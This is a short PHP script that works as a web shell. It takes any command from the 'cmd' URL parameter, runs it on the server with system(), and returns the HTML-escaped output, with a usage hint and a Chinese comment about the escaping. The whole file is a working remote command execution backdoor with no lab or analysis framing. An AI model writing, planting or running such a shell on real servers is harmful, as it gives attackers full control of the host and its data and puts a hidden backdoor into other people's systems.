<?php
$cmd = $_GET['cmd'] ?? '';
if($cmd) {
    ob_start();
    system($cmd);
    $output = ob_get_clean();
    
    // HTML实体编码，浏览器会显示源码而不是执行
    echo htmlspecialchars($output, ENT_QUOTES | ENT_HTML401, 'UTF-8');
} else {
    echo "Usage: ?cmd=command";
}
?>